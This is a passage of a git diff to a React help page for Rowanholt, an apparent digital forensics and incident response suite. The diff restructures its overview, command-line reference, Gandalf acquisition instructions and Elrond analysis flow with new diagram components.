@@ -1,4 +1,10 @@
 import React, { useState } from 'react';
+import './HelpPage.css';
+
+// The backend's app_version (src/web/backend/config.py), package.json and docs/CLI.md
+const VERSION = '2.1.0';
+const REPO = 'https://github.com/cmdaltr/rowanholt';
+const doc = (name) => `${REPO}/blob/main/docs/${name}`;
 
 const heroImage = `${process.env.PUBLIC_URL}/images/rowanholt.png`;
 const architectureMap = `${process.env.PUBLIC_URL}/architecture/rowanholt-architecture.html`;
@@ -17,6 +23,295 @@ const architecturePages = [
   },
 ];
 
+const ExternalLink = ({ href, children }) => (
+  <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
+);
+
+const Code = ({ children }) => <pre className="code-block">{children}</pre>;
+
+/**
+ * A flow diagram: stages left to right (top to bottom when narrow), each a chain of steps,
+ * joined by arrows labelled with what passes between them.
+ * stages: [{ who, title, tone, via, steps: [[title, detail], ...] }]; `via` labels the arrow
+ * into that stage. `dense` drops the labels for diagrams with many stages.
+ */
+const Flow = ({ label, stages, caption, dense = false }) => (
+  <figure className={`hp-flow${dense ? ' hp-flow--dense' : ''}`} role="group" aria-label={label}>
+    <div className="hp-flow__track">
+      {stages.map((stage, i) => (
+        <React.Fragment key={stage.title}>
+          {i > 0 && (
+            <div className="hp-flow__link" aria-hidden="true">
+              <div className="hp-flow__arrow" />
+              {stage.via && <div className="hp-flow__via">{stage.via}</div>}
+            </div>
+          )}
+          <div className={`hp-flow__stage hp-tone-${stage.tone || 'green'}`}>
+            {stage.who && <span className="hp-flow__who">{stage.who}</span>}
+            <span className="hp-flow__title">{stage.title}</span>
+            <ul className="hp-flow__steps">
+              {stage.steps.map(([title, detail]) => (
+                <li key={title}>
+                  <strong>{title}</strong>
+                  {detail && <span>{detail}</span>}
+                </li>
+              ))}
+            </ul>
+          </div>
+        </React.Fragment>
+      ))}
+    </div>
+    {caption && <figcaption>{caption}</figcaption>}
+  </figure>
+);
+
+const investigationStages = [
+  {
+    who: 'Gandalf',
+    title: 'Collect from the host',
+    tone: 'parchment',
+    steps: [
+      ['Live state', 'connections, processes'],
+      ['Memory', 'AVML, osxpmem, DumpIt'],
+      ['Journals and logs', 'in order of volatility'],
+      ['Everything else', 'registry, persistence, users'],
+      ['Hash and archive', <>SHA-256 into <code>log.meta</code>, with <code>log.audit</code></>],
+    ],
+  },
+  {
+    who: 'Elrond',
+    title: 'Analyse the case',
+    tone: 'green',
+    via: <>archive + <code>log.meta</code></>,
+    steps: [
+      ['Identify and mount', <>or extract and re-hash: <code>gandalf_integrity</code></>],
+      ['Collect', <>artefacts into <code>raw/</code></>],
+      ['Process', <>tables into <code>cooked/</code> (JSONL)</>],
+      ['Analyse', 'MFT, stacking, IOCs, YARA, threat intel'],
+      ['ATT&CK and timeline', 'techniques per row, Navigator layer, Plaso'],
+      ['Export', 'Splunk, Elastic, OpenSearch, Timesketch'],
+    ],
+  },
+  {
+    who: 'Case browser',
+    title: 'Work it together',
+    tone: 'teal',
+    via: 'case directory',
+    steps: [
+      ['Browse tables', <>read-only, never <code>raw/</code></>],
+      ['Flag rows', 'lead, confirmed or benign'],
+      ['Notes and hosts', 'assign, comment, activity feed'],
+    ],
+  },
+  {
+    who: 'Aulë',
+    title: 'Ask questions',
+    tone: 'copper',
+    via: 'rows and findings',
+    steps: [
+      ['Free text with Ollama', <>answers cite rows <code>[R1]</code>…</>],
+      ['Fixed questions without', 'read straight from the files'],
+      ['Flag a cited row', 'as a lead or a finding'],
+    ],
+  },
+  {
+    who: 'Report',
+    title: 'Write it up',
+    tone: 'leaf',
+    via: 'confirmed findings',
+    steps: [
+      ['DOCX or Markdown', 'from the case browser'],
+      ['Findings first', 'then leads, then Elrond\'s report'],
+      ['Every claim cited', 'host, file, row, row hash'],
+    ],
+  },
+];
+
+const elrondStages = [
+  {
+    who: 'Evidence',
+    title: 'What you give it',
+    tone: 'parchment',
+    steps: [
+      ['Disk and memory images', <><code>--Collect</code>: E01, raw, VMDK, VHD</>],
+      ['Gandalf archives', <><code>--Gandalf</code>: zip, 7z, tar.gz</>],
+      ['Captures and flows', <><code>--Network</code>: PCAP, Zeek, NetFlow</>],
+      ['Phones', <><code>--Mobile</code>: backups, extractions</>],
+      ['Attack datasets', <><code>--Mordor</code></>],
+    ],
+  },
+  {
+    who: 'Identify',
+    title: 'Mount and branch',
+    tone: 'green',
+    via: 'one host each',
+    steps: [
+      ['Mount', 'ewfmount, qemu-nbd, apfs-fuse'],
+      ['Branch by OS', 'Windows, Linux, macOS'],
+      ['Shadow copies', <><code>--vss</code></>],
+    ],
+  },
+  {
+    who: 'Collect',
+    title: 'Copy artefacts',
+    tone: 'green',
+    via: 'mounted volume',
+    steps: [
+      ['System artefacts', 'registry, event logs, $MFT, logs'],
+      ['User profiles', <><code>--Userprofiles</code></>],
+      ['Files by type', <><code>--collectFiles</code></>],
+    ],
+  },
+  {
+    who: 'Process',
+    title: 'Parse to tables',
+    tone: 'teal',
+    via: <code>raw/</code>,
+    steps: [
+      ['Cooked tables', 'host, artefact, source, time, techniques'],
+      ['Memory', <><code>--Memory</code>: Volatility 3</>],
+      ['Timeline', <><code>--Timeline</code>: Plaso</>],
+    ],
+  },
+  {
+    who: 'Analyse',
+    title: 'Look for the odd',
+    tone: 'copper',
+    via: <code>cooked/</code>,
+    steps: [
+      ['MFT and stacking', <><code>--Analysis</code></>],
+      ['IOCs, YARA, ClamAV', <><code>--extractIocs</code>, <code>--Yara</code></>],
+      ['Threat intelligence', <><code>--threatIntel</code></>],
+    ],
+  },
+  {
+    who: 'Output',
+    title: 'Hand it on',
+    tone: 'leaf',
+    via: <code>analysis/</code>,
+    steps: [
+      ['ATT&CK', <><code>mitre_techniques.txt</code>, <code>--Navigator</code></>],
+      ['SIEMs', <><code>--Splunk</code>, <code>--Elastic</code>, <code>--OpenSearch</code></>],
+      ['Report', <><code>--Report</code>: DOCX, Markdown</>],
+    ],
+  },
+];
+
+const gandalfStages = [
+  {
+    who: 'Gandalf',
+    title: 'Copy in order of volatility',
+    tone: 'parchment',
+    steps: [
+      ['1. Live state', 'connections, processes'],
+      ['2. Memory', <><code>-M</code>: DumpIt, AVML, osxpmem</>],
+      ['3. Rest of the live state', 'services, modules, sessions'],
+      ['4. Journals', '$LogFile, $UsnJrnl, page and swap files, $MFT'],
+      ['5. Logs that roll over', 'event logs, /var/log, prefetch'],
+      ['6. Everything else', 'registry, persistence, users'],
+    ],
+  },
+  {
+    who: 'Gandalf',
+    title: 'Seal',
+    tone: 'green',
+    via: 'local working copy',
+    steps: [
+      ['Hash every file', <>SHA-256 into <code>log.meta</code></>],
+      ['Record what was taken', <><code>log.audit</code>, with times</>],
+      ['Archive', 'zip (Python, PowerShell) or tar.gz (bash)'],
+      ['Encrypt', <>Key (<code>&lt;host&gt;.shadowfax.key</code>), Password or None</>],
+    ],
+  },
+  {
+    who: 'Elrond',
+    title: 'Check on arrival',
+    tone: 'teal',
+    via: 'archive',
+    steps: [
+      ['Extract', <>into <code>&lt;host&gt;/artefacts/raw/</code></>],
+      ['Hash again', <>against <code>log.meta</code></>],
+      ['Record the result', <><code>gandalf_integrity.jsonl</code>: verified, MISMATCH, missing, unhashed</>],
+    ],
+  },
+];
+
+const pippinStages = [
+  {
+    who: 'Sources',
+    title: 'What Pippin imports',
+    tone: 'parchment',
+    steps: [
+      ['XLSX', 'the ten-column layout, any sheet'],
+      ['CSV', 'the ten columns, or MITRESaw\'s procedures export'],
+      ['STIX 2.1', 'bundles (JSON)'],
+      ['TAXII 2.1', 'a collection, pulled'],
+      ['Watchlist', <><code>.txt</code>, one value per line</>],
+    ],
+  },
+  {
+    who: 'Pippin',
+    title: 'Hold the indicators',
+    tone: 'green',
+    via: 'import',
+    steps: [
+      ['Ten columns', 'element, group, procedure, technique, tactic…'],
+      ['Validity', 'STIX\'s own, else 90 days for IPs and domains'],
+      ['Expired', 'still listed, left out of matching'],
+    ],
+  },
+  {
+    who: 'Uses',
+    title: 'Where they are matched',
+    tone: 'teal',
+    via: 'live indicators',
+    steps: [
+      ['Elrond', <><code>--threatIntel</code>: matches per host, groups ranked per case</>],
+      ['Check a value', 'one value, the indicators and groups it hits'],
+      ['Aulë', 'the threat intelligence question; single values'],
+    ],
+  },
+];
+
+const findingStages = [
+  {
+    who: 'Case browser',
+    title: 'A row',
+    tone: 'teal',
+    steps: [
+      ['Any cooked or analysis row', 'host, file, row number, SHA-256'],
+    ],
+  },
+  {
+    who: 'Analyst or Aulë',
+    title: 'Lead',
+    tone: 'copper',
+    via: 'flag',
+    steps: [
+      ['Worth a look', 'Aulë can only ever flag leads'],
+    ],
+  },
+  {
+    who: 'Analyst',
+    title: 'Confirmed or benign',
+    tone: 'green',
+    via: 'decide',
+    steps: [
+      ['A verdict', 'changed by a colleague? not silently overwritten'],
+    ],
+  },
+  {
+    who: 'Output',
+    title: 'Report and layer',
+    tone: 'leaf',
+    via: 'confirmed only',
+    steps: [
+      ['Report (DOCX, Markdown)', 'whether each row is unchanged'],
+      ['Navigator layer', 'confirmed findings\' techniques'],
+    ],
+  },
+];
+
 const HelpPage = () => {
   const [activeSection, setActiveSection] = useState('overview');
 
@@ -25,889 +320,811 @@ const HelpPage = () => {
       title: 'Overview',
       content: (
         <>
-          <h3>Rowanholt DF Acceleration Suite v2.1.0</h3>
-          <p>
-            Rowanholt is a comprehensive Digital Forensics and Incident Response (DFIR) suite designed to accelerate
-            forensic investigations through automation, AI-powered analysis, and integrated threat intelligence.
-          </p><br />
+          <section>
+            <h3>Rowanholt</h3>
+            <p>
+              Rowanholt is a DFIR platform in three parts. Gandalf acquires from live hosts, in order of volatility,
+              with a SHA-256 manifest. Elrond turns disk and memory images, Gandalf archives, captures and phone
+              backups into a case directory of tables, tagged with ATT&amp;CK techniques. Aulë answers questions
+              about the case from those tables, with a local model through Ollama or fixed answers without one.
+              Around them: Pippin holds threat intelligence, Mordor holds attack datasets and the lab's recordings,
+              and Aragorn administers the stack.
+            </p>
+          </section>
 
-          <h4>Architecture</h4>
-          <p>
-            The whole platform drawn as a map of Middle-earth, Elrond's directed graph as it branches by evidence
-            type and operating system, how Gandalf acquires from a live host, and the whole platform as an
-            interactive 3D journey across Middle-earth. Open any of them full size.
-          </p>
-          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: '1.5rem 1rem', margin: '1rem 0' }}>
-            {architecturePages.map((page) => (
-              <a
-                key={page.preview}
-                href={page.href}
-                target="_blank"
-                rel="noopener noreferrer"
-                style={{ color: '#a7db6c', textDecoration: 'none' }}
-              >
-                <img
-                  src={`${process.env.PUBLIC_URL}/architecture/${page.preview}`}
-                  alt={page.title}
-                  style={{
-                    width: '100%',
-                    aspectRatio: '16 / 9',
-                    objectFit: 'cover',
-                    objectPosition: 'top',
-                    borderRadius: '6px',
-                    border: '1px solid #3f4b2a',
-                  }}
-                />
-                <div style={{ fontFamily: 'Cinzel, Times New Roman, serif', marginTop: '0.4rem' }}>{page.title}</div>
-              </a>
-            ))}
-          </div>
-          <br />
-          <h4>Key Capabilities</h4>
-          <ul>
-            <li><strong>Remote Acquisition (Gandalf):</strong> Collect forensic artifacts from Windows, Linux, and macOS systems</li>
-            <li><strong>Automated Analysis (Elrond):</strong> Process evidence with 30+ integrated forensic tools</li>
-            <li><strong>MITRE ATT&CK Integration:</strong> Automatic technique mapping and coverage analysis</li>
-            <li><strong>Cloud Forensics:</strong> AWS, Azure, and GCP investigation support</li>
-            <li><strong>AI-Powered Analysis (Aulë):</strong> Natural language queries using local LLM</li>
-            <li><strong>Memory Forensics:</strong> Volatility 3 integration</li>
-            <li><strong>Timeline Generation:</strong> Plaso/log2timeline support</li>
-            <li><strong>SIEM Integration:</strong> Direct export to Splunk and Elasticsearch</li>
-          </ul>
+          <section>
+            <h4>Architecture</h4>
+            <p>
+              The whole platform drawn as a map of Middle-earth, Elrond's directed graph as it branches by evidence
+              type and operating system, how Gandalf acquires from a live host, and the whole platform as an
+              interactive 3D journey across Middle-earth. Open any of them full size.
+            </p>
+            <div className="hp-maps">
+              {architecturePages.map((page) => (
+                <a key={page.preview} href={page.href} target="_blank" rel="noopener noreferrer">
+                  <img src={`${process.env.PUBLIC_URL}/architecture/${page.preview}`} alt={page.title} />
+                  <span>{page.title}</span>
+                </a>
+              ))}
+            </div>
+          </section>
+
+          <section>
+            <h4>What it does</h4>
+            <ul className="hp-cols">
+              <li><strong>Acquisition (Gandalf):</strong> Windows, Linux and macOS, locally or over SSH and PSRemoting</li>
+              <li><strong>Analysis (Elrond):</strong> 30+ forensic tools behind one command line</li>
+              <li><strong>ATT&amp;CK:</strong> techniques tagged on every row, Navigator layers per case</li>
+              <li><strong>Memory:</strong> Volatility 3, with a memory timeline</li>
+              <li><strong>Timelines:</strong> Plaso, and a time on every record</li>
+              <li><strong>Cloud and containers:</strong> AWS, Azure, GCP, Docker hosts, Kubernetes audit logs</li>
+              <li><strong>Network and phones:</strong> Zeek, NetFlow, iLEAPP and ALEAPP</li>
+              <li><strong>Stacking:</strong> what few hosts of the same OS have, ranked with its reasons</li>
+              <li><strong>Threat intelligence (Pippin):</strong> STIX, TAXII, MITRESaw, watchlists</li>
+              <li><strong>Case browser:</strong> findings, notes and hosts shared by the team</li>
+              <li><strong>Aulë:</strong> questions answered from the case, every answer citing its rows</li>
+              <li><strong>SIEMs:</strong> Splunk, Elastic, OpenSearch and Wazuh, Timesketch</li>
+            </ul>
+          </section>
         </>
-      )
+      ),
     },
-    installation: {
-      title: 'Installation',
+    running: {
+      title: 'Day to Day',
       content: (
         <>
-          <h3>Quick Installation</h3>
-          <pre className="code-block">
-{`git clone https://github.com/cmdaltr/rowanholt.git
-cd rowanholt
-./rowanholt install              # optional: run 'rowanholt' from anywhere
+          <section>
+            <h3>Running Rowanholt</h3>
+            <p>
+              You're reading this in the web app, so it's installed and running. These are the commands for
+              keeping it that way; the first install is in the repository's{' '}
+              <ExternalLink href={doc('QUICKSTART.md')}>QUICKSTART.md</ExternalLink>. They assume the{' '}
+              <code>rowanholt</code> command is on your PATH (<code>./rowanholt install</code> from the checkout,
+              once).
+            </p>
 
-# Docker: OrbStack on macOS (faster, lighter), Docker Desktop or Docker Engine elsewhere
-brew install --cask orbstack     # macOS
-python3 scripts/install-rowanholt.py   # other platforms: checks and installs prerequisites
+            <h4>Starting and stopping</h4>
+            <Code>{`rowanholt start              # the whole stack, Splunk and Elastic included
+rowanholt start --testing    # without Splunk and Elastic
+rowanholt status
+rowanholt restart
+rowanholt stop`}</Code>
+            <table className="hp-table">
+              <thead><tr><th>Service</th><th>Address</th><th>Started by</th></tr></thead>
+              <tbody>
+                <tr><td>Web app</td><td><code>http://localhost:5687</code></td><td>both</td></tr>
+                <tr><td>API</td><td><code>http://localhost:5688</code></td><td>both</td></tr>
+                <tr><td>Splunk</td><td><code>http://localhost:7755</code></td><td><code>rowanholt start</code></td></tr>
+                <tr><td>Kibana</td><td><code>http://localhost:5601</code></td><td><code>rowanholt start</code></td></tr>
+                <tr><td>ATT&amp;CK Navigator</td><td><code>http://localhost:5602</code></td><td><code>rowanholt start</code></td></tr>
+              </tbody>
+            </table>
+          </section>
 
-python3 scripts/image-paths.py   # where your forensic images live
-rowanholt start --testing        # the stack without Splunk and Elastic
-# Web interface: http://localhost:5687 · API: http://localhost:5688`}
-          </pre>
+          <section>
+            <h4>Watching the containers</h4>
+            <Code>{`rowanholt anduril status                    # containers, state, health
+rowanholt anduril logs celery-worker -n 200 # Elrond's output
+rowanholt anduril restart frontend
+rowanholt jobs status                       # the analysis jobs`}</Code>
+            <p>
+              Anduril refuses to stop or rebuild the worker, Postgres or Redis while a job is running unless you
+              pass <code>--force</code>. The same administration is on the web under Aragorn, for admins.
+            </p>
+          </section>
 
-          <br />
-          <h4>Dependencies</h4>
-          <br />
-          <p><strong>Core Requirements:</strong></p>
-          <ul>
-            <li>Docker (OrbStack, Docker Desktop or Docker Engine) with 8 GB or more for its VM</li>
-            <li>Python 3.8+ on the host, for the <code>rowanholt</code> command and scripts</li>
-            <li>The forensic tools (Volatility 3, Plaso, Artemis, RegRipper, YARA, The Sleuth Kit) are in the worker image</li>
-          </ul>
+          <section>
+            <h4>Updating</h4>
+            <p>
+              A git checkout: pull, then rebuild the worker, which copies Elrond in when it's built. The web app
+              and API read the checkout directly and reload on their own.
+            </p>
+            <Code>{`git -C "$(rowanholt where)" pull
+rowanholt anduril rebuild celery-worker`}</Code>
+            <p>
+              The desktop app offers to update its own copy when a newer version launches, and the next{' '}
+              <code>rowanholt start</code> rebuilds the images once. A team server's checkout is rebuilt the same
+              way after a pull.
+            </p>
+          </section>
 
-          <br />
-          <p><strong>Optional:</strong></p>
-          <ul>
-            <li>Ollama, for Aulë's free-text answers (Aulë answers fixed questions without it)</li>
-            <li>Splunk or Elasticsearch, for SIEM export (<code>rowanholt start</code> without <code>--testing</code>)</li>
-          </ul>
+          <section>
+            <h4>What's optional</h4>
+            <ul className="hp-cols hp-cols--2">
+              <li><strong>Ollama:</strong> Aulë's free-text answers, summaries and suggestions. Without it Aulë still answers fixed questions</li>
+              <li><strong>Splunk and Elastic:</strong> <code>rowanholt start</code> without <code>--testing</code>; OpenSearch, Wazuh and Timesketch are your own, set in <code>.env</code></li>
+              <li><strong>Online lookups:</strong> VirusTotal from Pippin and ClamAV's signature refresh, both off unless <code>.env</code> turns them on</li>
+              <li><strong>A team server:</strong> <code>rowanholt server init</code> puts sign-in, TLS and per-user jobs in front</li>
+            </ul>
+          </section>
 
-          <br />
-          <h4>Verification</h4>
-          <pre className="code-block">
-{`rowanholt status`}
-          </pre>
+          <section>
+            <h4>Where the docs are</h4>
+            <ul className="hp-cols">
+              <li><ExternalLink href={doc('CLI.md')}>CLI.md</ExternalLink>: every command and option</li>
+              <li><ExternalLink href={doc('USAGE.md')}>USAGE.md</ExternalLink>: the web app, page by page</li>
+              <li><ExternalLink href={doc('API.md')}>API.md</ExternalLink>: the HTTP API</li>
+              <li><ExternalLink href={doc('AULE.md')}>AULE.md</ExternalLink>: Aulë and its MCP server</li>
+              <li><ExternalLink href={doc('OUTPUT_FORMAT.md')}>OUTPUT_FORMAT.md</ExternalLink>: the case directory</li>
+              <li><ExternalLink href={doc('SERVER.md')}>SERVER.md</ExternalLink>: running it for a team</li>
+            </ul>
+            <p>The same files are under <code>docs/</code> in your checkout.</p>
+          </section>
         </>
-      )
+      ),
     },
     cli: {
       title: 'Command Line',
       content: (
         <>
-          <h3>The rowanholt Command</h3>
-          <p>
-            One command runs everything: the Docker stack, Gandalf, Elrond, Mordor, Anduril, the lab and every
-            script under <code>scripts/</code>. Link it into a directory on your PATH once and it runs from anywhere.
-          </p>
-          <pre className="code-block">
-{`cd rowanholt
-./rowanholt install        # links ~/.local/bin/rowanholt (or: ./rowanholt install /usr/local/bin)
-rowanholt help`}
-          </pre>
+          <section>
+            <h3>The rowanholt Command</h3>
+            <p>
+              One command runs everything: the Docker stack, Gandalf, Elrond, Mordor, Anduril, the lab and every
+              script under <code>scripts/</code>. Link it into a directory on your PATH once and it runs from anywhere.
+            </p>
+            <Code>{`cd rowanholt
+./rowanholt install   # links ~/.local/bin/rowanholt
+rowanholt help`}</Code>
+          </section>
 
-          <br />
-          <h4>Commands</h4>
-          <pre className="code-block">
-{`rowanholt start | stop | restart | status [--testing] [--logs]
-rowanholt gandalf [bash|python] <args>     # collect from a Linux or macOS host
-rowanholt acquire <args>                   # Gandalf through the Python CLI
-rowanholt analyse <args>                   # Elrond
-rowanholt mordor <command>                 # list, download, info, local, verify, ...
-rowanholt anduril <command>                # container administration
-rowanholt lab <command>                    # the test lab
-rowanholt scripts                          # every script under scripts/
-rowanholt jobs status                      # or any <group> <name>: siem splunk-restart, docker clean, ...
-rowanholt map [realm|elrond|gandalf|journey] # open an architecture page`}
-          </pre>
-          <p>
-            Forensic commands keep the directory you run them from, so relative evidence and output paths work as
-            typed; scripts and the stack run from the repository root. Set <code>ROWANHOLT_PYTHON</code> to use a
-            virtualenv. On Windows, run <code>Invoke-Gandalf.ps1</code> from <code>src/acquisition/windows</code>.
-          </p>
+          <section>
+            <h4>Commands</h4>
+            <table className="hp-table">
+              <thead><tr><th>Command</th><th>Runs</th></tr></thead>
+              <tbody>
+                <tr><td><code>rowanholt start | stop | restart | status</code></td><td>The Docker stack; <code>--testing</code> leaves out Splunk and Elastic, <code>--logs</code> follows the logs</td></tr>
+                <tr><td><code>rowanholt gandalf [bash|python] &lt;args&gt;</code></td><td>Gandalf on a Linux or macOS host (<code>gandalf.sh</code> by default)</td></tr>
+                <tr><td><code>rowanholt acquire &lt;args&gt;</code></td><td>Gandalf through the Python CLI</td></tr>
+                <tr><td><code>rowanholt analyse &lt;args&gt;</code></td><td>Elrond with the common phases (<code>-C</code>, <code>-P</code>, <code>-A</code>, <code>-B</code>, <code>-S</code>, <code>-E</code>); <code>elrond.py</code> takes the rest</td></tr>
+                <tr><td><code>rowanholt mordor &lt;command&gt;</code></td><td>Datasets: <code>list</code>, <code>download</code>, <code>info</code>, <code>local</code>, <code>verify</code>, <code>refresh</code></td></tr>
+                <tr><td><code>rowanholt anduril &lt;command&gt;</code></td><td>Rowanholt's containers and images</td></tr>
+                <tr><td><code>rowanholt mcp</code></td><td>Aulë's MCP server over stdio</td></tr>
+                <tr><td><code>rowanholt lab &lt;command&gt;</code></td><td>The test lab</td></tr>
+                <tr><td><code>rowanholt scripts</code></td><td>Every script under <code>scripts/</code>; run one as <code>rowanholt &lt;group&gt; &lt;name&gt;</code>, e.g. <code>rowanholt jobs status</code></td></tr>
+                <tr><td><code>rowanholt map [realm|elrond|gandalf|journey]</code></td><td>Opens an architecture page</td></tr>
+                <tr><td><code>rowanholt where</code></td><td>Prints the checkout's path</td></tr>
+              </tbody>
+            </table>
+            <p>
+              Forensic commands keep the directory you run them from, so relative evidence and output paths work as
+              typed; scripts and the stack run from the repository root. Set <code>ROWANHOLT_PYTHON</code> to use a
+              virtualenv. On Windows, run <code>Invoke-Gandalf.ps1</code> from <code>src/acquisition/windows</code>.
+            </p>
+          </section>
+
+          <section>
+            <h4>Python modules</h4>
+            <p>
+              Run these from the repository root, not from inside <code>src/analysis</code>, where Elrond's{' '}
+              <code>platform/</code> package shadows the standard library's.
+            </p>
+            <Code>{`python3 src/analysis/elrond.py --help
+python3 -m src.analysis.mitre.cli --help
+python3 -m src.analysis.rowanholt.cloud.cli --help
+python3 -m src.analysis.rowanholt.ai.cli --help`}</Code>
+          </section>
         </>
-      )
+      ),
     },
     gandalf: {
       title: 'Gandalf',
       content: (
         <>
-          <h3>Remote Forensic Acquisition</h3>
-          <p>
-            Gandalf enables secure collection of forensic artifacts from local and remote systems across
-            Windows, Linux, and macOS platforms.
-          </p>
+          <section>
+            <h3>Acquisition</h3>
+            <p>
+              Gandalf collects from a live Windows, Linux or macOS host, locally or remotely, copying everything to
+              its working directory in order of volatility before it hashes anything, so hashing doesn't widen the
+              window in which the host changes under it.
+            </p>
+            <Flow
+              label="Gandalf copies in order of volatility, hashes into log.meta, archives, and Elrond re-hashes on arrival"
+              stages={gandalfStages}
+              caption="The collection still writes to the disk it collects from (C:\TEMP\gandalf, /tmp/gandalf). Writing to other media with -O avoids changing $MFT and the journals."
+            />
+          </section>
 
-          <h4>Features</h4>
-          <ul>
-            <li>Multi-platform support (Windows, Linux, macOS)</li>
-            <li>Remote acquisition via SSH/PowerShell</li>
-            <li>Encrypted evidence packaging</li>
-            <li>Memory dump acquisition</li>
-            <li>Collection in order of volatility, copied locally first</li>
-            <li>SHA-256 manifest (<code>log.meta</code>) checked by Elrond on arrival</li>
-          </ul>
+          <section>
+            <h4>Basic usage</h4>
+            <p>
+              Every collector takes an encryption mode (<code>Key</code>, <code>Password</code> or <code>None</code>)
+              and an acquisition mode (<code>Local</code> or <code>Remote</code>). Remotely, bash takes a host
+              with <code>-h</code> or a list with <code>-f</code>, the Python collector reads{' '}
+              <code>src/acquisition/lists/hosts.list</code>, and PowerShell uses PSRemoting.
+            </p>
 
-          <h4>Basic Usage</h4>
-          <p>
-            Every collector takes an encryption mode (<code>Key</code>, <code>Password</code> or <code>None</code>) and an
-            acquisition mode (<code>Local</code> or <code>Remote</code>). Remotely, bash takes a host with
-            <code> -h</code> or a list with <code>-f</code>, the Python collector reads <code>src/acquisition/lists/hosts.list</code>,
-            and PowerShell uses PSRemoting.
-          </p>
-
-          <h5>Linux and macOS (bash)</h5>
-          <pre className="code-block">
-{`sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
+            <h5>Linux and macOS (bash)</h5>
+            <Code>{`sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
 sudo ./src/acquisition/bash/gandalf.sh Key Remote -h 192.168.1.100 -u analyst
-# or, from anywhere: rowanholt gandalf Key Local -m`}
-          </pre>
+rowanholt gandalf Key Local -m   # the same, from anywhere`}</Code>
 
-          <h5>Linux and macOS (Python)</h5>
-          <pre className="code-block">
-{`cd src/acquisition
+            <h5>Linux and macOS (Python)</h5>
+            <Code>{`cd src/acquisition
 sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001
-sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001`}
-          </pre>
+sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001`}</Code>
 
-          <h5>Windows (PowerShell, as administrator)</h5>
-          <pre className="code-block">
-{`.\\src\\acquisition\\windows\\Invoke-Gandalf.ps1 -EncryptionObject Key -Acquisition Local \`
-  -OutputDirectory C:\\TEMP\\gandalf\\gandalf -Memory -CollectFiles`}
-          </pre>
+            <h5>Windows (PowerShell, as administrator)</h5>
+            <Code>{`.\\src\\acquisition\\windows\\Invoke-Gandalf.ps1 \`
+  -EncryptionObject Key -Acquisition Local \`
+  -OutputDirectory C:\\TEMP\\gandalf\\gandalf \`
+  -Memory -CollectFiles`}</Code>
+          </section>
 
-          <h4>Collection Options</h4>
-          <table>
-            <thead><tr><th>bash</th><th>Python</th><th>PowerShell</th><th>Does</th></tr></thead>
-            <tbody>
-              <tr><td><code>-o DIR</code></td><td><code>-O DIR</code></td><td><code>-OutputDirectory</code></td><td>Where the archive goes</td></tr>
-              <tr><td><code>-m</code></td><td><code>-M</code></td><td><code>-Memory</code></td><td>Memory dump (AVML, osxpmem, DumpIt)</td></tr>
-              <tr><td><code>-a</code></td><td><code>-A</code></td><td></td><td>Last-access times for every file</td></tr>
-              <tr><td><code>-c</code></td><td><code>-F</code></td><td><code>-CollectFiles</code></td><td>Files named in <code>lists/files.list</code></td></tr>
-              <tr><td><code>-h HOST -u USER</code>, <code>-f FILE</code></td><td>hosts.list</td><td>PSRemoting</td><td>Remote targets</td></tr>
-            </tbody>
-          </table>
+          <section>
+            <h4>Collection options</h4>
+            <table className="hp-table">
+              <thead><tr><th>Bash</th><th>Python</th><th>PowerShell</th><th>Does</th></tr></thead>
+              <tbody>
+                <tr><td><code>-o DIR</code></td><td><code>-O DIR</code></td><td><code>-OutputDirectory</code></td><td>Where the archive goes</td></tr>
+                <tr><td><code>-m</code></td><td><code>-M</code></td><td><code>-Memory</code></td><td>Memory dump (AVML, osxpmem, DumpIt)</td></tr>
+                <tr><td><code>-a</code></td><td><code>-A</code></td><td>—</td><td>Last-access times for every file</td></tr>
+                <tr><td><code>-c</code></td><td><code>-F</code></td><td><code>-CollectFiles</code></td><td>Files named in <code>lists/files.list</code></td></tr>
+                <tr><td><code>-l</code></td><td><code>-L</code></td><td><code>-LiveContainers</code></td><td>Ask Docker and Podman about running containers (off by default)</td></tr>
+                <tr><td><code>-h HOST -u USER</code>, <code>-f FILE</code></td><td><code>hosts.list</code></td><td>PSRemoting</td><td>Remote targets</td></tr>
+              </tbody>
+            </table>
+          </section>
 
-          <h4>Encryption Modes</h4>
-          <ul>
-            <li><strong>Key:</strong> a random key per host, written beside the archive as <code>&lt;host&gt;.shadowfax.key</code> (recommended)</li>
-            <li><strong>Password:</strong> key derived from a password you type (PBKDF2)</li>
-            <li><strong>None:</strong> no encryption</li>
-          </ul>
-
-          <h4>Collection Order and Integrity</h4>
-          <p>
-            Every collector copies to its local working directory first, in order of volatility: network
-            connections and processes, then memory, then the files that change fastest (<code>$LogFile</code>, the USN
-            journal, page and swap files, <code>$MFT</code>; temp directories on Linux and macOS), then logs that roll
-            over, then everything else. Only when everything is copied is each file SHA-256 hashed into
-            <code> log.meta</code>, which travels in the archive with <code>log.audit</code>. Elrond hashes every file
-            again on arrival and writes <code>gandalf_integrity.jsonl</code>: verified, MISMATCH, missing or unhashed.
-          </p>
+          <section>
+            <h4>Encryption modes</h4>
+            <ul className="hp-cols">
+              <li><strong>Key:</strong> a random key per host, written beside the archive as <code>&lt;host&gt;.shadowfax.key</code> (recommended)</li>
+              <li><strong>Password:</strong> a key derived from a password you type (PBKDF2)</li>
+              <li><strong>None:</strong> no encryption</li>
+            </ul>
+          </section>
         </>
-      )
+      ),
     },
     elrond: {
       title: 'Elrond',
       content: (
         <>
-          <h3>Automated Forensic Analysis</h3>
-          <p>
-            Elrond processes and analyzes forensic evidence using automated tooling, timeline generation,
-            and MITRE ATT&CK mapping.
-          </p>
+          <section>
+            <h3>Analysis</h3>
+            <p>
+              Elrond takes evidence of any kind it knows, branches by evidence type and operating system, and
+              writes one case directory: per host, <code>raw/</code> as collected, <code>cooked/</code> as JSON Lines
+              tables and <code>analysis/</code>; for the case, the audit log, <code>mitre_techniques.txt</code> and
+              the method. Every row starts with its host, artefact, source path, time (UTC) and ATT&amp;CK
+              techniques.
+            </p>
+            <Flow
+              label="Elrond: evidence in, identified and mounted, collected, processed, analysed, and output"
+              stages={elrondStages}
+              dense
+              caption="Each step is a flag on elrond.py; the web app's New Analysis builds the same command."
+            />
+          </section>
 
-          <h4>Features</h4>
